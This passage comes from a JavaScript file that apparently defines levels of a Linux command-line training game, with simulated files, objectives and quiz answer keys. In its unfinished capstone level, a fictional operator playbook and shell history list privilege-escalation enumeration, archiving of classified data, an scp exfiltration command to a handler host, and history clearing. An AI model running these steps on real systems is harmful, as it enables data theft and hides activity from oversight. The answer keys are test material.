daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1000:1000:Administrator:/home/admin:/bin/bash
svcaccount:x:1001:1001:Service Account:/home/svcaccount:/bin/bash
developer:x:1002:1002:Developer:/home/developer:/bin/bash
s3rv1c3:x:1003:1003::/home/s3rv1c3:/bin/bash
guest:x:1004:1004:Guest:/home/guest:/usr/sbin/nologin`
                },
                '/etc/group': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 384,
                    content: `root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:admin,svcaccount
sudo:x:27:admin,s3rv1c3
www-data:x:33:
docker:x:999:admin,developer
admin:x:1000:
svcaccount:x:1001:
developer:x:1002:
s3rv1c3:x:1003:
guest:x:1004:`
                },
                '/etc/shells': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 128,
                    content: `/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/zsh`
                },
            },

            objectives: [
                { id: 1, task: 'LIST: User Accounts', hint: '$ cat /etc/passwd | cut -d: -f1',
                  check: (cmd, state, output) => cmd.includes('passwd') &&
                         output && (output.includes('root') || output.includes('admin') || output.includes('s3rv1c3')) },
                { id: 2, task: 'CHECK: User Details', hint: '$ getent passwd s3rv1c3',
                  check: (cmd, state, output) => (cmd.includes('getent') || cmd.includes('id ')) &&
                         output && (output.includes('1003') || output.includes('/home/') || output.includes(':x:')) },
                { id: 3, task: 'LIST: Group Memberships', hint: '$ groups admin (or cat /etc/group)',
                  check: (cmd, state, output) => (cmd.includes('groups') || (cmd.includes('cat') && cmd.includes('group'))) &&
                         output && (output.includes('sudo') || output.includes('admin') || output.includes('docker')) },
                { id: 4, task: 'CHECK: Password Status', hint: '$ passwd -S admin (or chage -l)',
                  check: (cmd, state, output) => ((cmd.includes('passwd') && cmd.includes('-S')) || cmd.includes('chage')) &&
                         output && (output.includes('Password') || output.includes('Last') || output.includes('Expire')) },
                { id: 5, task: 'AUDIT: Login Shells', hint: '$ grep -v nologin /etc/passwd',
                  check: (cmd, state, output) => (cmd.includes('shells') || cmd.includes('nologin') || cmd.includes('/bin/bash')) &&
                         output && (output.includes('bash') || output.includes('/bin/sh') || output.includes('admin')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the username of the backdoor account created by the attacker?",
                acceptedAnswers: ["s3rv1c3", "S3RV1C3"],
                hint: "Look for accounts with suspicious naming patterns (leet-speak) created around the time of the incident.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "That's not the backdoor account. Look for unusual naming patterns in the user audit.",
                correctAnswerMessage: "CONFIRMED. s3rv1c3 (leet-speak for 'service') - created at 02:52:33, added to sudo group. Textbook persistence technique."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-028: System Monitoring
        // Theme: Real-time system analysis
        // ──────────────────────────────────────────────────────────
        'CLH-028': {
            title: 'System Monitoring',
            description: 'Monitor system resources and detect anomalies.',
            prerequisites: ['CLH-027'],
            tier: 'CLI Ghost',
            user: 'monitor',
            hostname: 'OPS-CENTER',
            startDir: '/home/monitor',
            allowedCommands: null,

            filesystem: {
                '/home/monitor': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['dashboards', 'alerts', 'scripts', 'reports', '.bashrc', '.bash_history', '.monitoring_cheatsheet']
                },
                '/home/monitor/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'monitor', group: 'monitor', size: 312,
                    content: `ps aux
ps aux | head -20
ps aux --sort=-%cpu | head
top
htop
free -h
vmstat 1 5
iostat -x 1 3
df -h
du -sh /var/log/*
cat /proc/loadavg
uptime
cat alerts/suspicious_proc.txt | grep -i miner
`
                },
                '/home/monitor/.monitoring_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 1024,
                    content: `MONITORING CHEATSHEET
=====================

PROCESS COMMANDS:
  ps aux                   # All processes with details
  ps aux --sort=-%cpu      # Sort by CPU (highest first)
  ps aux --sort=-%mem      # Sort by memory
  ps -ef --forest          # Process tree view
  top                      # Real-time process viewer
  htop                     # Interactive process viewer

MEMORY COMMANDS:
  free -h                  # Human-readable memory info
  cat /proc/meminfo        # Detailed memory stats
  vmstat 1 5               # Virtual memory stats (1 sec, 5 times)

DISK COMMANDS:
  df -h                    # Disk space usage
  du -sh /*                # Directory sizes
  iostat -x               # I/O statistics
  iotop                    # Real-time I/O monitor

CPU COMMANDS:
  cat /proc/loadavg        # Load averages
  uptime                   # System uptime and load
  mpstat                   # CPU statistics

THREAT INDICATORS:
  - Process using >90% CPU = potential miner
  - Unknown process in /tmp = suspicious
  - Netcat (nc) with persistent connection = C2
  - Process name matches PID (e.g. "6666") = hiding

ANSWER: Rogue PID is 6666 (xmrig cryptominer)
`
                },
                '/home/monitor/dashboards': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['cpu_history.log', 'memory_history.log', 'network_io.log', 'process_count.log']
                },
                '/home/monitor/dashboards/cpu_history.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 512,
                    content: `CPU HISTORY LOG - OPS-CENTER
=============================
2026-01-17 08:00  NORMAL    12% avg
2026-01-17 09:00  NORMAL    15% avg
2026-01-17 10:00  NORMAL    18% avg
2026-01-17 11:00  WARNING   45% avg (spike detected)
2026-01-17 12:00  CRITICAL  95% avg (ALERT TRIGGERED)
2026-01-17 13:00  CRITICAL  97% avg (cryptominer active)
`
                },
                '/home/monitor/dashboards/memory_history.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `MEMORY HISTORY LOG - OPS-CENTER
================================
2026-01-17 08:00  2.1GB / 8GB  (26%)
2026-01-17 09:00  2.3GB / 8GB  (29%)
2026-01-17 10:00  2.8GB / 8GB  (35%)
2026-01-17 11:00  4.2GB / 8GB  (52%) - WARNING
2026-01-17 12:00  6.8GB / 8GB  (85%) - CRITICAL
`
                },
                '/home/monitor/dashboards/network_io.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `NETWORK I/O LOG - OPS-CENTER
=============================
2026-01-17 11:45  OUTBOUND: 10.0.0.88:4444 - 15MB/hr (suspicious)
2026-01-17 12:00  OUTBOUND: 10.0.0.88:4444 - 45MB/hr (C2 traffic?)
2026-01-17 12:30  OUTBOUND: mining.pool.xxx:3333 - 2MB/hr
Note: PID 6666 established connection to mining pool
`
                },
                '/home/monitor/dashboards/process_count.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 256,
                    content: `PROCESS COUNT LOG
=================
Normal baseline: 85-110 processes
2026-01-17 11:00: 112 processes (+2 unknown)
Unknown PIDs: 6666 (xmrig), 7777 (nc)
`
                },
                '/home/monitor/alerts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['high_cpu.txt', 'suspicious_proc.txt', 'network_anomaly.txt', 'README.txt']
                },
                '/home/monitor/alerts/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 256,
                    content: `ALERT SYSTEM README
===================
Alerts are generated automatically when thresholds exceed:
- CPU > 80% for 5+ minutes
- Memory > 85%
- Unknown processes spawn
- Outbound connections to non-whitelisted IPs

Review suspicious_proc.txt for current threats.
`
                },
                '/home/monitor/alerts/suspicious_proc.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 512,
                    content: `SUSPICIOUS PROCESSES DETECTED
==============================
*** ROGUE PID IDENTIFIED: 6666 ***

PID 6666 - xmrig (cryptominer) - 95% CPU
  └── Parent: unknown (possible rootkit)
  └── Location: /tmp/.hidden/xmrig
  └── Connection: mining.pool.xxx:3333

PID 7777 - nc (netcat) - Persistent connection
  └── Destination: 10.0.0.88:4444 (C2 server)
  └── Duration: 3 hours continuous

PID 8888 - /tmp/.hidden/backdoor
  └── Persistence: cron @reboot
  └── Function: Reverse shell

ACTION: Investigate PID 6666 immediately
`
                },
                '/home/monitor/alerts/high_cpu.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `HIGH CPU ALERT
==============
Timestamp: 2026-01-17 12:00:00
Threshold: 80%
Current: 97%

Top Offenders:
1. xmrig (PID 6666) - 95.2% - CRYPTOMINER DETECTED
2. backdoor (PID 8888) - 1.2%
3. nc (PID 7777) - 0.8%

Recommendation: Terminate PID 6666 and investigate origin
`
                },
                '/home/monitor/alerts/network_anomaly.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `NETWORK ANOMALY ALERT
=====================
Detected: Outbound connection to non-whitelisted host

Source: PID 7777 (nc)
Destination: 10.0.0.88:4444
Protocol: TCP
Duration: Persistent (3+ hours)
Data transferred: 62MB

This pattern matches Command & Control (C2) behavior.
`
                },
                '/home/monitor/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['check_cpu.sh', 'kill_miners.sh']
                },
                '/home/monitor/scripts/check_cpu.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'monitor', group: 'monitor', size: 256,
                    content: `#!/bin/bash
# check_cpu.sh - Find high CPU processes
echo "=== TOP CPU CONSUMERS ==="
ps aux --sort=-%cpu | head -10
echo ""
echo "=== LOAD AVERAGE ==="
cat /proc/loadavg
`
                },
                '/home/monitor/scripts/kill_miners.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'monitor', group: 'monitor', size: 256,
                    content: `#!/bin/bash
# kill_miners.sh - Terminate known cryptominer processes
# WARNING: Requires root privileges
MINERS="xmrig minerd cpuminer"
for miner in $MINERS; do
    pkill -9 $miner && echo "Killed: $miner"
done
`
                },
                '/home/monitor/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['daily_summary.txt', 'incident_report.txt']
                },
                '/home/monitor/reports/daily_summary.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `DAILY MONITORING SUMMARY
========================
Date: 2026-01-17
System: OPS-CENTER

Status: COMPROMISED
Alerts: 4 CRITICAL
Incidents: 1 (cryptominer + C2)

Rogue PID: 6666
Action Required: IMMEDIATE

Summary: System compromised by cryptominer at 11:00.
C2 channel established via netcat. Backdoor persistence detected.
`
                },
                '/home/monitor/reports/incident_report.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 512,
                    content: `INCIDENT REPORT - IR-2026-0117-001
===================================
Classification: HIGH

INDICATORS OF COMPROMISE:
1. Cryptominer (xmrig) - PID 6666
2. C2 Channel (netcat) - PID 7777
3. Backdoor persistence - PID 8888

TIMELINE:
11:00 - Initial compromise (unknown vector)
11:05 - xmrig deployed, CPU spike
11:10 - C2 channel established
11:15 - Backdoor installed in cron

ROOT CAUSE: Under investigation
`
                },
                '/home/monitor/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 128,
                    content: '# Monitor .bashrc\nexport PS1="[monitor@OPS-CENTER]$ "\nalias ll="ls -la"\nalias topcpu="ps aux --sort=-%cpu | head"\n'
                },
            },

            objectives: [
                { id: 1, task: 'VIEW: Process List', hint: '$ ps aux', check: (cmd, state, output) => cmd.includes('ps') && output && output.includes('PID') },
                { id: 2, task: 'MONITOR: Real-time View', hint: '$ top (or htop)', check: (cmd, state, output) => cmd.includes('top') || cmd.includes('htop') },
                { id: 3, task: 'CHECK: Memory Usage', hint: '$ free -h', check: (cmd, state, output) => cmd.includes('free') && output && (output.includes('Mem') || output.includes('total')) },
                { id: 4, task: 'VIEW: System Stats', hint: '$ vmstat or iostat', check: (cmd, state, output) => (cmd.includes('vmstat') || cmd.includes('iostat') || cmd.includes('iotop')) },
                { id: 5, task: 'FIND: Suspicious Process', hint: 'Check alerts/suspicious_proc.txt', check: (cmd, state, output) => output && (output.includes('6666') || output.includes('xmrig') || output.includes('cryptominer')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the PID of the rogue cryptominer process?",
                acceptedAnswers: ["6666", "PID 6666"],
                hint: "Read the suspicious_proc.txt alert file for the rogue PID.",
                hintAfterAttempts: 3
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-029: Vim Essentials
        // Theme: Essential editor skills for field operations
        // ──────────────────────────────────────────────────────────
        'CLH-029': {
            title: 'Vim Essentials',
            description: 'Master the essential text editor for field operations.',
            prerequisites: ['CLH-028'],
            tier: 'CLI Ghost',
            user: 'operator',
            hostname: 'FIELD-OPS',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['training', 'configs', 'missions', 'scripts', '.vimrc', '.bashrc', '.bash_history', '.vim_cheatsheet']
                },
                '/home/operator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 256,
                    content: `vim training/practice.txt
cat .vimrc
vim configs/network.conf
vim missions/op_serpent.txt
cat .vim_cheatsheet
vim --version
ls -la
cat training/vim_modes.txt
`
                },
                '/home/operator/.vim_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 1536,
                    content: `VIM SURVIVAL CHEATSHEET
=======================
Field Operatives Edition - MEMORIZE THIS

MODES:
  i     = Insert mode (type text)
  ESC   = Return to Normal mode
  v     = Visual mode (select text)
  :     = Command mode

NAVIGATION (Normal mode):
  h j k l  = left/down/up/right
  w        = next word
  b        = previous word
  0        = start of line
  $        = end of line
  gg       = top of file
  G        = bottom of file
  :42      = go to line 42

EDITING:
  dd    = delete line
  yy    = copy (yank) line
  p     = paste after cursor
  u     = undo
  Ctrl+r = redo
  x     = delete character
  r     = replace character

SAVE & QUIT:
  :w    = save (write)
  :q    = quit
  :wq   = save and quit
  :q!   = quit without saving (force)
  ZZ    = save and quit (shortcut)

SEARCH:
  /pattern  = search forward
  ?pattern  = search backward
  n         = next match
  N         = previous match

FIELD TIP: If vim freezes, you pressed Ctrl+S
Fix: Press Ctrl+Q to unfreeze

ESCAPE SEQUENCE: VIMLOCK
(Remember: V-I-M-L-O-C-K = "Vim Is My Lock On Chaos Key")
`
                },
                '/home/operator/.vimrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: `" Field Operator .vimrc
" Optimized for stealth operations

set number           " Show line numbers
syntax on            " Enable syntax highlighting
set tabstop=4        " Tab = 4 spaces
set autoindent       " Auto-indent new lines
set hlsearch         " Highlight search results
set incsearch        " Incremental search
set nobackup         " No backup files (OPSEC)
set noswapfile       " No swap files (leave no trace)
set encoding=utf-8   " UTF-8 encoding

" Escape Sequence: VIMLOCK
" This is your vim mastery confirmation code
`
                },
                '/home/operator/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 128,
                    content: '# Operator .bashrc\nexport PS1="[operator@FIELD-OPS]$ "\nexport EDITOR=vim\nalias vi="vim"\nalias ll="ls -la"\n'
                },
                '/home/operator/training': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['practice.txt', 'mission_template.txt', 'vim_modes.txt', 'README.txt']
                },
                '/home/operator/training/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 384,
                    content: `VIM TRAINING DIRECTORY
======================
Welcome to vim training, operative.

Why vim?
- Available on EVERY Linux/Unix system
- Works over low-bandwidth SSH connections
- Leaves no GUI traces
- Fast once mastered

Start with practice.txt, then read vim_modes.txt.
Check your .vim_cheatsheet for quick reference.
`
                },
                '/home/operator/training/practice.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: `VIM PRACTICE FILE
=================
Line 1: The quick brown fox
Line 2: jumps over the lazy dog
Line 3: Pack my box with five dozen
Line 4: liquor jugs
Line 5: How vexingly quick daft zebras jump

EXERCISES:
1. Navigate to line 4 using :4
2. Delete line 4 using dd
3. Undo with u
4. Search for "fox" using /fox
5. Go to end of file with G
6. Save and quit with :wq

Practice until these are muscle memory.
`
                },
                '/home/operator/training/mission_template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 384,
                    content: `MISSION REPORT TEMPLATE
=======================
OPERATION: [NAME]
DATE: [YYYY-MM-DD]
HANDLER: [CODENAME]

OBJECTIVE:
[Describe mission objective]

EXECUTION:
[Step-by-step account]

OUTCOME:
[ ] SUCCESS
[ ] PARTIAL
[ ] COMPROMISED

NOTES:
[Additional observations]
`
                },
                '/home/operator/training/vim_modes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 640,
                    content: `VIM MODES EXPLAINED
===================

NORMAL MODE (default):
  - Navigation and commands
  - Press ESC to return here
  - Most time spent here when skilled

INSERT MODE:
  - Press 'i' to enter
  - Type text normally
  - Press ESC to exit

VISUAL MODE:
  - Press 'v' to enter
  - Select text with movement keys
  - Operations affect selected text

COMMAND MODE:
  - Press ':' to enter
  - Type commands like :wq, :q!, :set number
  - Press ENTER to execute

TIP: If lost, press ESC multiple times to return to Normal mode.
`
                },
                '/home/operator/configs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['network.conf', 'services.conf', 'ssh_config']
                },
                '/home/operator/configs/network.conf': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: `# Network Configuration
# Field Operations Server

INTERFACE=eth0
IP_ADDRESS=10.0.0.42
SUBNET_MASK=255.255.255.0
GATEWAY=10.0.0.1
DNS_PRIMARY=8.8.8.8
DNS_SECONDARY=1.1.1.1

# Proxy settings for covert ops
PROXY_ENABLED=true
PROXY_HOST=proxy.field-ops.local
PROXY_PORT=8080
`
                },
                '/home/operator/configs/services.conf': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: `# Services Configuration

[SSH]
Port=22
PermitRootLogin=no
PasswordAuthentication=no

[HTTP]
Port=80
SSL_Port=443

[VPN]
Port=1194
Protocol=UDP
`
                },
                '/home/operator/configs/ssh_config': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 256,
                    content: `# SSH Client Config
Host handler
    HostName 10.0.0.1
    User specter
    IdentityFile ~/.ssh/id_ed25519

Host *
    ServerAliveInterval 60
    AddKeysToAgent yes
`
                },
                '/home/operator/missions': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['op_serpent.txt', 'mission_log.txt']
                },
                '/home/operator/missions/op_serpent.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: `OPERATION SERPENT
=================
Classification: SECRET

STATUS: DRAFT - NEEDS EDITING

Objective: Infiltrate target network
Timeline: 72 hours

Phase 1: Reconnaissance (complete)
Phase 2: Initial access (in progress)
Phase 3: Persistence (pending)
Phase 4: Exfiltration (pending)

TODO: Edit this file with vim to add notes.
Use :wq to save your changes.
`
                },
                '/home/operator/missions/mission_log.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 384,
                    content: `MISSION LOG
===========
2026-01-17 08:00 - Arrived at FIELD-OPS station
2026-01-17 08:15 - Reviewed vim training materials
2026-01-17 09:00 - Practiced navigation commands
2026-01-17 10:00 - Edited first config file successfully
2026-01-17 11:00 - Ready for field deployment

Note: Remember escape sequence VIMLOCK for verification.
`
                },
                '/home/operator/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['quick_edit.sh', 'backup_configs.sh']
                },
                '/home/operator/scripts/quick_edit.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 256,
                    content: `#!/bin/bash
# quick_edit.sh - Open file in vim with line numbers
if [ -z "$1" ]; then
    echo "Usage: ./quick_edit.sh <filename>"
    exit 1
fi
vim -c "set number" "$1"
`
                },
                '/home/operator/scripts/backup_configs.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 256,
                    content: `#!/bin/bash
# backup_configs.sh - Backup config files
DATE=$(date +%Y%m%d)
tar -czf configs_backup_$DATE.tar.gz configs/
echo "Configs backed up to configs_backup_$DATE.tar.gz"
`
                },
            },

            objectives: [
                { id: 1, task: 'OPEN: Practice File', hint: '$ vim training/practice.txt', check: (cmd, state, output) => (cmd.includes('vim') || cmd.includes('vi')) && cmd.includes('practice') },
                { id: 2, task: 'READ: Vim Config', hint: '$ cat ~/.vimrc', check: (cmd, state, output) => cmd.includes('vimrc') && output && output.includes('set number') },
                { id: 3, task: 'STUDY: Vim Modes', hint: '$ cat training/vim_modes.txt', check: (cmd, state, output) => output && (output.includes('NORMAL MODE') || output.includes('INSERT MODE')) },
                { id: 4, task: 'REVIEW: Cheatsheet', hint: '$ cat .vim_cheatsheet', check: (cmd, state, output) => output && output.includes('VIMLOCK') },
                { id: 5, task: 'EDIT: Mission File', hint: '$ vim missions/op_serpent.txt', check: (cmd, state, output) => (cmd.includes('vim') || cmd.includes('vi')) && (cmd.includes('mission') || cmd.includes('serpent') || cmd.includes('conf')) },
            ],

            insightPhase: {
                enabled: true,
                question: "What is the vim mastery escape sequence mentioned in the training materials?",
                acceptedAnswers: ["VIMLOCK", "vimlock"],
                hint: "Check the .vim_cheatsheet or .vimrc files for the escape sequence.",
                hintAfterAttempts: 3
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-030: OPERATION CHIMERA (Capstone)
        // Theme: Final comprehensive mission
        // ──────────────────────────────────────────────────────────
        'CLH-030': {
            title: 'OPERATION CHIMERA',
            description: 'Final capstone mission. Apply all skills to compromise and exfiltrate from a high-value target.',
            prerequisites: ['CLH-029'],
            tier: 'CLI Ghost',
            user: 'ghost',
            hostname: 'CHIMERA',
            startDir: '/home/ghost',
            allowedCommands: null,

            filesystem: {
                '/home/ghost': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['mission', 'tools', 'staging', 'recon', '.bashrc', '.bash_history', '.ssh', '.chimera_playbook']
                },
                '/home/ghost/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 512,
                    content: `whoami
pwd
ls -la
cat mission/briefing.txt
cat mission/objectives.txt
cat .chimera_playbook
find / -perm -4000 2>/dev/null
find /data -type f -name "*.pdf" 2>/dev/null
cat /data/classified/project_chimera.pdf
grep -r "PHOENIX" /data/ 2>/dev/null
tar -czf staging/intel.tar.gz /data/classified/
history -c
`
                },
                '/home/ghost/.chimera_playbook': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 1536,
                    content: `CHIMERA OPERATOR PLAYBOOK
=========================
Classification: EYES ONLY

PHASE 1 - RECONNAISSANCE
  whoami && pwd        # Verify identity and position
  ls -la               # Survey immediate environment
  cat /etc/passwd      # Enumerate users
  cat mission/*        # Review mission parameters

PHASE 2 - PRIVILEGE ESCALATION
  find / -perm -4000   # Find SUID binaries
  cat /etc/sudoers     # Check sudo permissions
  sudo -l              # List allowed commands

PHASE 3 - LATERAL MOVEMENT
  cat ~/.ssh/known_hosts    # Previous connections
  cat /var/log/auth.log     # Authentication history

PHASE 4 - DATA DISCOVERY
  find /data -type f -name "*.pdf"   # Locate documents
  grep -r "classified" /data/        # Search content
  cat /data/classified/*             # Read targets

PHASE 5 - EXFILTRATION
  tar -czf staging/intel.tar.gz /data/classified/
  scp staging/intel.tar.gz handler@10.0.0.1:/dropbox/

VERIFICATION CODE: PHOENIX-7
(Required for mission completion confirmation)

"The chimera has three heads. Master all to succeed."
`
                },
                '/home/ghost/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
                    content: '# Ghost .bashrc\nexport PS1="[ghost@CHIMERA]$ "\nexport HISTSIZE=0\nalias ll="ls -la"\nalias rm="rm -f"\n# OPSEC: History disabled\n'
                },
                '/home/ghost/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'ghost', group: 'ghost',
                    children: ['id_ed25519', 'id_ed25519.pub', 'known_hosts', 'authorized_keys']
                },
                '/home/ghost/.ssh/id_ed25519': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 464,
                    content: '-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED - Ghost operator key]\n-----END OPENSSH PRIVATE KEY-----\n'
                },
                '/home/ghost/.ssh/id_ed25519.pub': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 100,
                    content: 'ssh-ed25519 AAAA[REDACTED]xxxx ghost@shadow\n'
                },
                '/home/ghost/.ssh/known_hosts': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 256,
                    content: '10.0.0.1 ecdsa-sha2-nistp256 AAAA[handler]\n10.0.0.42 ecdsa-sha2-nistp256 AAAA[internal]\n192.168.1.100 ecdsa-sha2-nistp256 AAAA[target]\n'
                },
                '/home/ghost/.ssh/authorized_keys': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 128,
                    content: 'ssh-ed25519 AAAA[REDACTED] specter-1@handler\n'
                },
                '/home/ghost/mission': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['briefing.txt', 'objectives.txt', 'contacts.txt', 'rules_of_engagement.txt']
                },
                '/home/ghost/mission/briefing.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 1024,
                    content: `OPERATION CHIMERA - FINAL MISSION BRIEFING
==========================================
Classification: TOP SECRET//NOFORN
Date: 2026-01-17
Handler: SPECTER-1

SITUATION:
You have achieved initial foothold on the CHIMERA network.
This is the final test of your CLI Ghost capabilities.

TARGET ORGANIZATION: Chimera Holdings Inc.
NETWORK: Isolated high-security environment
ACCESS: Standard user "ghost" via SSH key exchange

MISSION OBJECTIVES:
1. Complete environment reconnaissance
2. Identify privilege escalation paths
3. Locate classified project documentation
4. Extract verification code from classified data
5. Prepare intelligence package for exfiltration

SUCCESS CRITERIA:
- All objectives completed without triggering alerts
- Verification code (PHOENIX-7) identified and confirmed
- Intel package staged for exfiltration

"The chimera tests all your skills. Only true Ghosts complete it."
`
                },
                '/home/ghost/mission/objectives.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 640,
                    content: `MISSION OBJECTIVES - DETAILED
==============================

[X] Objective 1: RECON
    - Establish identity (whoami)
    - Confirm position (pwd)
    - Survey environment (ls -la)

[ ] Objective 2: INTEL GATHERING
    - Read all mission files
    - Understand target organization
    - Identify data locations

[ ] Objective 3: PRIVILEGE ANALYSIS
    - Find SUID binaries
    - Check sudo capabilities
    - Identify escalation vectors

[ ] Objective 4: DATA DISCOVERY
    - Locate classified directory
    - Identify target documents
    - Find verification code

[ ] Objective 5: EXFILTRATION PREP
    - Package intel with tar
    - Stage in designated directory
    - Confirm package integrity

VERIFICATION: Report code PHOENIX-7 upon completion
`
                },
                '/home/ghost/mission/contacts.txt': {
                    type: 'file', perms: '-rw-------', owner: 'ghost', group: 'ghost', size: 384,
                    content: `OPERATIONAL CONTACTS
====================
FOR EMERGENCY USE ONLY

Handler: SPECTER-1
  - Contact: 10.0.0.1 (SSH)
  - Backup: Dead drop at /tmp/.specter

Tech Support: WRAITH-3
  - Available: 0200-0400 UTC
  - Signal: knock-knock protocol

Extraction: PHANTOM-9
  - Trigger: File at /tmp/.extract
  - Window: 15 minutes max

ABORT CODE: BLACKOUT-ZERO
Use only if mission is compromised.
`
                },
                '/home/ghost/mission/rules_of_engagement.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ghost', group: 'ghost', size: 512,
                    content: `RULES OF ENGAGEMENT
===================

1. MINIMIZE FOOTPRINT
   - Avoid unnecessary commands
   - Don't modify system files
   - Clear history when done

2. AVOID DETECTION
   - Don't create new users
   - Don't install software
   - Don't open outbound connections (except to handler)

3. DATA HANDLING
   - Only copy designated targets
   - Use staging directory for packaging
   - Encrypt before exfiltration (if time permits)

4. ABORT CONDITIONS
   - Detection confirmed
   - Mission parameters change
   - Handler signals abort

Violation of ROE = Mission failure
`
                },
                '/home/ghost/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ghost', group: 'ghost',
                    children: ['scanner.sh', 'privesc_check.sh', 'exfil.sh', 'cleanup.sh']
                },
                '/home/ghost/tools/scanner.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'ghost', group: 'ghost', size: 384,
                    content: `#!/bin/bash
# scanner.sh - Environment reconnaissance
echo "[*] Chimera Scanner v1.0"
echo "========================"
echo ""
echo "[+] Current User: $(whoami)"
echo "[+] Hostname: $(hostname)"
echo "[+] Working Dir: $(pwd)"
echo ""
echo "[+] Users on system:"
cat /etc/passwd | grep -v "nologin" | cut -d: -f1
echo ""
echo "[+] Network connections:"
netstat -an 2>/dev/null | head -10
echo ""
echo "[*] Scan complete"
`
                },
